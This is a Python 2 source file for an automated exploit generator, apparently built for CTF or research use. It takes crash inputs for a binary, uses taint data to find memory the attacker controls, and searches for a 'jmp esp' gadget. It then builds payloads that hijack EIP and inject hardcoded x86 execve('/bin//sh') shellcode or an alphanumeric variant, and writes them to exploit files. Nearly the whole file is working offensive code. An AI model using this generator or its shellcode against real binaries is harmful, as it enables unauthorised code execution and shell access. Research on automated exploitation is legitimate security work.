#!/usr/bin/env python
# coding=utf-8

"""
Module      : solver.py 
Create By   : Bluecake
Description : A simple test for class Exploiter
"""


from multiprocessing import Process
from emulator import *
import logging
from pwn import *
import os
from exploiter import *

class Exp_gen(object):

    def __init__(self, binary, crash):
        if not os.path.exists(binary):
            print('donnot have the file: '+ binary)
            exit(-1)
        self.binary = binary
        self.crash = crash
        self.shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
        self.ascii_shellcode = "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA"
        self.controledMemory = list()
        self.finished = list()
        self.exp = list()
        self.exp_sended = list()
        self.jmp_esp = 0
        self.use_jmp_esp = 0 
        self.isFinished = False

    def find_jmp_esp(self):
        import ropgadget
        import sys
        sys.argv = ['ropgadget', '--binary', self.binary, '--only', 'jmp']
        args = ropgadget.args.Args().getArgs()
        core = ropgadget.core.Core(args)
        core.do_binary(self.binary)
        core.do_load(0)
        for gadget in core._Core__gadgets:
            if 'esp' in gadget['gadget']:
                return gadget['vaddr']
        return 0
    def dealTaintedList(self,taintedData):
        self.controledMemory = list()
        taintedData.sort()
        start = taintedData[0]
        lastdata = taintedData[0]
        #nowdata = taintedData[0]
        size = 1
        for i in range(1,len(taintedData)):
            if taintedData[i] > lastdata+1:
                #size 
                self.controledMemory.append({'start':start,'size':size})
                start = taintedData[i]
                size = 1
            else:
                size += 1

            if i == (len(taintedData)-1):
                self.controledMemory.append({'start':start,'size':size})
            
            lastdata = taintedData[i]

    def findShellcodeAddr(self,src,len):
        for m in self.controledMemory:
            if ((src>=m['start']) &( src<=(m['start']+m['size']))):
                #print hex(src + 4 + len ),hex(m['start']),hex(m['start']+m['size'])
                if (src + 4 + len)<= (m['start']+m['size']) :
                    self.use_jmp_esp = 1
                    return src +4
                if (src - len) >= m['start']:
                    return src - len
        for m in self.controledMemory:
            if m['size']>len:
                return  m['start']
        return 0

    def checkShellcodeLen(self,src,len):
        for m in self.controledMemory:
            if((src>=m['start'])&( src<=(m['start']+m['size']))& ((src+len)<=(m['start']+m['size'] ) ) ):
                return True
        return False

    def checkFinished(self):
        return self.isFinished

    def run(self):
        self.isFinished=False
        num = 0
        self.jmp_esp = self.find_jmp_esp()
        #print '[++]',hex(self.jmp_esp)
        exp_folder = self.binary[:-3] + 'exp/'
        if not os.path.exists(exp_folder):
             os.makedirs(exp_folder)
        for crash_file in self.crash:
            self.use_jmp_esp = 0 
            exp = Exploiter(self.binary, crash_file)
            if exp.getCrashType() == crash.CONTROL_PC:
                
                if exp.getcrash_point() in self.finished:
                    print '[-] The crash point has been solved'
                    continue
                else:
                    self.finished.append(exp.getcrash_point())
                shellcodeAddr = 0
                if len(exp.taintedData) > 0:
                    self.dealTaintedList(exp.taintedData)
                src = exp.getCrashMemory()
                target = self.shellcode
                shellcodeAddr = self.findShellcodeAddr(src,len(target))

                if shellcodeAddr == 0:
                    print '[-] cannot find enough momery for shellcode'
                    continue
                    #return False
                #print hex(src)
                #print hex(shellcodeAddr)
                # check if eip can be controled to shellcode's address 
                #eip = range()
                eip = range(src, src + 4)
                exp.setdst(eip)
                if self.use_jmp_esp & (self.jmp_esp != 0):
                    preResult  = exp.pcPayload(map(ord, p32(self.jmp_esp)))
                else:
                    preResult  = exp.pcPayload(map(ord, p32(shellcodeAddr)))
                if len(preResult) <= 0:
                    print '[-] EIP cannot be valued to shellcode'
                    continue
                shellcode = range(shellcodeAddr,shellcodeAddr+len(target))
                exp.setdst(eip + shellcode)
                if self.use_jmp_esp& (self.jmp_esp != 0):
                    payload = exp.pcPayload(map(ord, p32(self.jmp_esp))+map(ord, target))
                else:
                    payload = exp.pcPayload(map(ord, p32(shellcodeAddr))+map(ord, target))
                if len(payload) > 0:
                    with open(exp_folder + 'exp.' + str(num), 'wb') as f:
                        num += 1
                        self.exp.append(exp_folder + 'exp.' + str(num-1))
                        f.write(payload)
                    
                #print payload

            elif exp.getCrashType() == crash.SHELLCODE:
                if exp.getcrash_point() in self.finished:
                    continue
                else:
                    self.finished.append(exp.getcrash_point())

                if len(exp.taintedData) > 0:
                    self.dealTaintedList(exp.taintedData)
                else:
                    print '[-] No data can be controled'
                    continue
                target = self.shellcode
                src = exp.getCrashMemory()
                if not self.checkShellcodeLen(src,len(target)):
                    print '[-] Shellcode size not enough'
                    continue

                exp.setdst(range(src,src+len(target)))
                payload = exp.pcPayload(target)
                #print payload
                if len(payload) == 0:
                    target = self.ascii_shellcode
                    if not self.checkShellcodeLen(src,len(target)):
                        print '[-] Shellcode size not enough'
                        continue
                    exp.setdst(range(src,src+len(target)))
                    payload = exp.pcPayload(target)
                if len(payload) >0:
                    with open(exp_folder + 'exp.' + str(num), 'wb') as f:
                        num += 1
                        self.exp.append(exp_folder + 'exp.' + str(num-1))
                        f.write(payload)
                #print payload

            else:
                #return False
                continue
        self.isFinished=True
    def start(self):
        p = Process(target=self.run)
        self.pro = p
        p.start()

    def getExp(self):
        tmp = list()
        for i in self.exp:
            if i in self.exp_sended:
                continue
            else:
                tmp.append(i)
                self.exp_sended.append(i)
        return tmp

    def stopExploit(self):
        self.pro.terminate()
        self.pro.join()
        pass



